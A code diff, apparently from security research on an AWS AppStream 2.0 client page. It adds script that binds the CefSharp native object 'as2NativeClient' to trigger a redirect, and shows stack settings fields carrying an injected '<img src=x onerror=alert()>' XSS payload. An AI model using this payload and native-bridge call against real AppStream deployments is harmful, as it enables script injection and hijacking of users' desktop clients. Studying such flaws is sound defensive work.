@@ -1,4 +1,11 @@
-/*var xhttp = new XMLHttpRequest();
+       window.CefSharp.BindObjectAsync("as2NativeClient")
+        .then((result) => {
+          if(window.as2NativeClient) {
+            window.as2NativeClient.redirectToHomeWithUrl("https://google.com");
+          }
+        }
+  
+  /*var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
       //var xhttp1 = new XMLHttpRequest();
@@ -13,7 +20,7 @@
 
 //alert()
 
- window.siteConfig = {
+ /*window.siteConfig = {
     logLevel: "WARN",
     cdnURL: "https://appstream2.us-east-1.aws.amazon.com/",
     isManagedStack: false,
@@ -28,4 +35,6 @@
     stackInfo: {"redirectURL":"http://ded-example.com/one.py","embedHostDomains":null,"state":"ACTIVE","accessEndpoints":null,"createdTime":"Jul 4, 2020 5:27:42 PM","applicationSettings":{"settingsGroup":"ExampleStackLol\u0027\"`\u003e\u003cimg src\u003dx onerror\u003dalert()\u003e","enabled":true,"s3KeyPrefix":null,"s3BucketName":"appstream-app-settings-us-east-1-597299136010-6dbkrz0b"},"themeName":"theme_ExampleStack","userSettings":[{"action":"CLIPBOARD_COPY_FROM_LOCAL_DEVICE","permission":"ENABLED"},{"action":"CLIPBOARD_COPY_TO_LOCAL_DEVICE","permission":"ENABLED"},{"action":"FILE_UPLOAD","permission":"ENABLED"},{"action":"FILE_DOWNLOAD","permission":"ENABLED"},{"action":"PRINTING_TO_LOCAL_DEVICE","permission":"ENABLED"}],"iamRoleArn":null,"storageConnectors":[{"resourceIdentifier":"appstream2-36fb080bb8-us-east-1-597299136010","connectorType":"S3","domains":null}],"feedbackURL":"https://example.com/feedback","name":"ExampleStack","displayName":"Test","arn":"arn:aws:appstream:us-east-1:597299136010:stack/ExampleStack","description":"This is a sample stack with sample applicationsLol\u0027\"`\u003e\u003cimg src\u003dx onerror\u003dalert()\u003e\n","awsAccountId":"597299136010","stackErrors":null},
     useThirdPartySpinner: false,
     defaultDcvJS: "2020.0-8438"
-  };
+  };*/
+
+
